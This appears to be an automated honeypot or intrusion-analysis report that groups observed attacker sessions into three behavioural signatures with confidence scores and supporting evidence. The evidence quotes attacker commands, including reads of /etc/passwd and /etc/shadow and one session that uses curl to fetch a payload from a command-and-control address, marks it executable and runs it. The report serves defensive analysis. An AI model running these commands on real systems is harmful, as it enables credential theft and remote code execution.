# Behavioural Signature Generation Report

- Signature schema version: 1.0
- Signatures generated: 3
- Low-confidence signatures: 0

## Signature summary
### sig-b1feaa1697ecd1bb (Command execution)
- Cluster ID: 0
- Supporting sessions: 1 (1.85%)
- Evidence strength: Medium (0.76)
- Command categories: file_system
- Representative commands: cd /tmp
- Authentication profile: {"observed": true, "success_count": 1, "failure_count": 0, "success_rate": 100.0, "notes": "Authentication success/failure observed from session_details.json."}
- Supporting evidence: ["Observed commands: cd /tmp; Command categories: file_system; Authentication success flag: 1; Session duration: 0.680853"]
- Limitations: Small sample size: fewer than two supporting sessions.

### sig-7a800a68707bfcfd (Mixed/Unclassified)
- Cluster ID: 1
- Supporting sessions: 7 (12.96%)
- Evidence strength: High (0.9)
- Command categories: reconnaissance, file_system, privilege_escalation, credential_attack, file_transfer, networking
- Representative commands: cat /etc/passwd, exit, ls -la, pwd, uname -a
- Authentication profile: {"observed": true, "success_count": 7, "failure_count": 0, "success_rate": 100.0, "notes": "Authentication success/failure observed from session_details.json."}
- Supporting evidence: ["Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.224239", "Observed commands: ./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit; Command categories: file_system, file_transfer, networking, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 21.458934", "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 10.762586", "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.383391", "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.278874"]
- Limitations: Behavioural interpretation is mixed or weakly supported by the available evidence.

### sig-47188a96dccd0950 (Credential-attack behaviour)
- Cluster ID: 2
- Supporting sessions: 46 (85.19%)
- Evidence strength: High (0.9)
- Command categories: None observed
- Representative commands: nan
- Authentication profile: {"observed": true, "success_count": 0, "failure_count": 46, "success_rate": 0.0, "notes": "Authentication success/failure observed from session_details.json."}
- Supporting evidence: ["Authentication success flag: 0; Session duration: 3.052236", "Authentication success flag: 0; Session duration: 5.033859", "Authentication success flag: 0; Session duration: 1.024292", "Authentication success flag: 0; Session duration: 3.027873", "Authentication success flag: 0; Session duration: 5.025731"]
- Limitations: No command-category evidence available for this cluster.

